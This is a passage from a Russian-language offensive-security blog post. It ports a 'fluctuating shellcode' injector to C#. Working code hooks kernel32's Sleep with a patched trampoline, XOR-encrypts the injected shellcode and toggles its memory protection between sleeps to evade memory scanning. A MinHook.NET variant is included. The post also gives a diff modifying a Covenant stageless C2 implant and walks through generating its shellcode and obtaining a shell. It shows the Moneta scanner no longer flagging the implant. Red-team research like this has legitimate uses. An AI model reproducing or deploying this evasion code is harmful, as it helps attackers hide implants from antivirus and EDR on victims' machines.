    sleepOrig = (Sleep)Marshal.GetDelegateForFunctionPointer(sleepOriginAddress, typeof(Sleep));

    // Бэкапим первые 16 байт оригинальной функции Sleep
    Marshal.Copy(sleepOriginAddress, sleepOriginBytes, 0, 16);

    // Получаем адрес метода SleepDetour, которым будет пропатчен шаблон трамплина
    var sleepDetour = new Sleep(SleepDetour);
    sleepDetourAddress = Marshal.GetFunctionPointerForDelegate(sleepDetour);
    gchSleepDetour = GCHandle.Alloc(sleepDetour);

    using (var ms = new MemoryStream())
    using (var bw = new BinaryWriter(ms))
    {
        // Составляем little-endian адрес sleepDetourAddress в виде байтового массива
        bw.Write((ulong)sleepDetourAddress);
        sleepDetourBytes = ms.ToArray();
    }

    // Патчим этим адресом шаблон трамплина
    for (var i = 0; i < sleepDetourBytes.Length; i++)
        trampoline[i + 2] = sleepDetourBytes[i];

    // Инициализируем другие оставшиеся поля класса FluctuateShellcode, к которым должны иметь доступ его методы
    shellcodeAddress = shellcodeAddr;
    shellcodeLength = shellcodeLen;
    xorKey = GenerateXorKey();
}
```

Важный момент, на котором стоит остановиться отдельно: так как мы работаем с **управляемой** средой .NET, адрес метода `SleepDetour` будет недоступен для неуправляемого кода, если только мы явно не попросим его таковым быть. Здесь на помощь приходит хендл [GCHandle](https://docs.microsoft.com/ru-ru/dotnet/api/system.runtime.interopservices.gchandle?view=net-6.0), дающий способ получения доступа к управляемому объекту из неуправляемой памяти (подсмотрел [в этом ответе](https://stackoverflow.com/a/8496328/6253579) на Stack Overflow).

Метод `GCHandle.Alloc` запрещает сборщику мусора трогать адрес делегата `sleepDetourAddress`, тем самым «фиксируя» его на время всего времени работы инжектора. Чтобы отпустить удерживание адреса, мы используем деструктор:

```cs
~FluctuateShellcode()
{
    if (gchSleepDetour.IsAllocated)
        gchSleepDetour.Free();

    DisableHook();
}
```

### Тестирование

Время лабораторных испытаний. Чтобы успеть увидеть флипы и шифрование памяти в Process Hacker, я добавлю инструкцию `Thread.Sleep(5000)` в начало функции `SleepDetour`. Скомпилируем проект (обязательно в x64) и запустим.

Сперва смотрим на содержимое области памяти с шеллкодом, которое шифруется при каждом вызове `Sleep`.

[![fluctuate-shellcode-memory.gif](/assets/images/shellcode-fluctuation/fluctuate-shellcode-memory.gif)](/assets/images/shellcode-fluctuation/fluctuate-shellcode-memory.gif)
{:.center-image}

Обфускация области памяти с шеллкодом
{:.quote}

Еще одно демо, на котором видна перезапись памяти kernel32.dll: трамплин сменяется оригинальным содержимым и наоборот.

[![fluctuate-sleep-trampoline.gif](/assets/images/shellcode-fluctuation/fluctuate-sleep-trampoline.gif)](/assets/images/shellcode-fluctuation/fluctuate-sleep-trampoline.gif)
{:.center-image}

Установка и снятие хука Sleep
{:.quote}

Тесты в контроллируемой среде пройдены, время для полевых испытаний!

# Использование с агентом C2

Для демонстрации работы инжектора с реальным C2 сперва нужно определиться с фреймворком, который мы будем использовать. Показывать работу флуктуатора с Cobalt Strike бессмысленно (хотя с ней он тоже работает), ведь изначальной целью было научиться встраивать обсуждаемую технику в open source проекты, да и `sleep_mask` в свежих версиях «Кобы» работает как надо.

Итак, какой же C2 нам выбрать? Агент Meterpreter полностью интерактивный, и не использует `Sleep` (ладно, там есть [Sleep Control](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-sleep-control.html), но реализованно это как-то странно – *"In short, the sleep command is a transport switch to the current transport with a delay. Simple!"*), [PoshC2](https://github.com/nettitude/PoshC2) не имеет stageless-имплантов, и его код частично закрыт, а в [Sliver](https://github.com/BishopFox/sliver) генерирует слишком большой шеллкод в силу особенностей языка, на котором он написан (это Go, ага).

Мой выбор пал на [Covenant](https://github.com/cobbr/Covenant), для которого [@ShitSecure](https://twitter.com/ShitSecure) недавно [показал](https://s3cur3th1ssh1t.github.io/Covenant_Stageless_HTTP/), как создавать stageless-импланты. Отличный кандидат, как по мне!

Я загружу [код](https://gist.github.com/S3cur3Th1sSh1t/967927eb89b81a5519df61440357f945) кастомного stageless-импланта и изменю в нем задержки (Delays), реализованные через `Thread.Sleep`, на полноценный вызов `Sleep` из kernel32.dll.

[![covenant-stageless-modification.png](/assets/images/shellcode-fluctuation/covenant-stageless-modification.png)](/assets/images/shellcode-fluctuation/covenant-stageless-modification.png)
{:.center-image}

Thread.Sleep → kernel32!Sleep
{:.quote}

Вот такой патч у меня получился, если кто-то захочет повторить:

```diff
14a15
> using System.Runtime.InteropServices;
277a279,281
>         [DllImport("kernel32.dll")]
>         static extern void Sleep(int dwMilliseconds);
>
354c358
<                     Thread.Sleep((Delay + change) * 1000);
---
>                     Sleep((Delay + change) * 1000);
430c434
<                                     Thread.Sleep(3000);
---
>                                     Sleep(3000);
```

Далее я залогинюсь в Covenant и создам новый темплейт.

[![covenant-stageless-template.png](/assets/images/shellcode-fluctuation/covenant-stageless-template.png)](/assets/images/shellcode-fluctuation/covenant-stageless-template.png)
{:.center-image}

Добавление stageless-агента в Covenant
{:.quote}

Теперь создаем новые Listener и Launcher в формате шеллкода на основе добавленного темплейта.

[![covenant-generate-shellcode.png](/assets/images/shellcode-fluctuation/covenant-generate-shellcode.png)](/assets/images/shellcode-fluctuation/covenant-generate-shellcode.png)
{:.center-image}

Генерация шеллкода в Covenant
{:.quote}

Остается заменить `sleepDll.bin` на путь до нового шеллкода и можно запускать инжектор!

[![covenant-test.png](/assets/images/shellcode-fluctuation/covenant-test.png)](/assets/images/shellcode-fluctuation/covenant-test.png)
{:.center-image}

You've poped a (fluctuating) shell!
{:.quote}

Если просканировать область памяти, содержащей шеллкод, с помощью [Moneta](https://github.com/forrest-orr/moneta), можно видеть, что мы избавились от одного из самых показательных индикаторов заражения – исполняемой приватной памяти.

[![moneta-ioc.png](/assets/images/shellcode-fluctuation/moneta-ioc.png)](/assets/images/shellcode-fluctuation/moneta-ioc.png)
{:.center-image}

Никакого Abnormal private executable memory
{:.quote}

И, разумеется, я не мог не портировать созданный код на D/Invoke и не включить его в свой инжектор, который зачастую использую на проектах.

[![vimeo-thumbnail](/assets/images/shellcode-fluctuation/vimeo-thumbnail)](https://vimeo.com/719398239)

Демо
{:.quote}

# Бонус. Реализация API Hooking с помощью MiniHook.NET

В качестве бонуса оставлю здесь реализацию класса флуктуатора, которая использует MiniHook.NET. Можешь сам оценить, сильно ли уменьшился объем кода.

```cs
class FluctuateShellcodeMiniHook
{
    // using MinHook; // https://github.com/CCob/MinHook.NET

    delegate void Sleep(uint dwMilliseconds);
    readonly Sleep sleepOrig;
    readonly HookEngine hookEngine;

    readonly uint fluctuateWith;
    readonly IntPtr shellcodeAddress;
    readonly int shellcodeLength;
    readonly byte[] xorKey;

    public FluctuateShellcodeMiniHook(uint fluctuate, IntPtr shellcodeAddr, int shellcodeLen)
    {
        hookEngine = new HookEngine();
        sleepOrig = hookEngine.CreateHook("kernel32.dll", "Sleep", new Sleep(SleepDetour));

        fluctuateWith = fluctuate;
        shellcodeAddress = shellcodeAddr;
        shellcodeLength = shellcodeLen;
        xorKey = GenerateXorKey();
    }

    ~FluctuateShellcodeMiniHook()
    {
        hookEngine.DisableHooks();
    }

    public void EnableHook()
    {
        hookEngine.EnableHooks();
    }

    public void DisableHook()
    {
        hookEngine.DisableHooks();
    }

    void SleepDetour(uint dwMilliseconds)
    {
        ProtectMemory(fluctuateWith);
        XorMemory();

        sleepOrig(dwMilliseconds);

        XorMemory();
        ProtectMemory(DI.Data.Win32.WinNT.PAGE_EXECUTE_READ);
    }

    void ProtectMemory(uint newProtect)
    {
        if (Win32.VirtualProtect(shellcodeAddress, (uint)shellcodeLength, newProtect, out _))
            Console.WriteLine("(FluctuateShellcodeMiniHook) [DEBUG] Re-protecting at address " + string.Format("{0:X}", shellcodeAddress.ToInt64()) + $" to {newProtect}");
        else
            throw new Exception("(FluctuateShellcodeMiniHook) [-] VirtualProtect");
    }

    void XorMemory()
    {
        byte[] data = new byte[shellcodeLength];
        Marshal.Copy(shellcodeAddress, data, 0, shellcodeLength);
        for (var i = 0; i < data.Length; i++) data[i] ^= xorKey[i];
        Marshal.Copy(data, 0, shellcodeAddress, data.Length);
    }

    byte[] GenerateXorKey()
    {
        Random rnd = new Random();
        byte[] xorKey = new byte[shellcodeLength];
        rnd.NextBytes(xorKey);
        return xorKey;
    }
}
```

# Выводы

В этой статье мы разобрали базовые основы техники Inline API Hooking и портировали инжектор флуктуирующего шеллкода на C# для обхода сигнатурного сканирования памяти.

Стоит отметить, что разобранный код все еще продолжает оставаться «доказательством концепции», и не стоит ожидать от него волшебных возможностей обхода зрелых AV и EDR прямо «из коробки» (все же мы использовали наиболее банальную технику инжекта). Можешь обратить внимание на более продвинутые техники инжекта шеллкода, как например [Module Stomping](https://offensivedefence.co.uk/posts/module-stomping/) или [ThreadStackSpoofer](https://github.com/mgeeky/ThreadStackSpoofer) и комбинировать их с техникой флуктуирующего шеллкода.
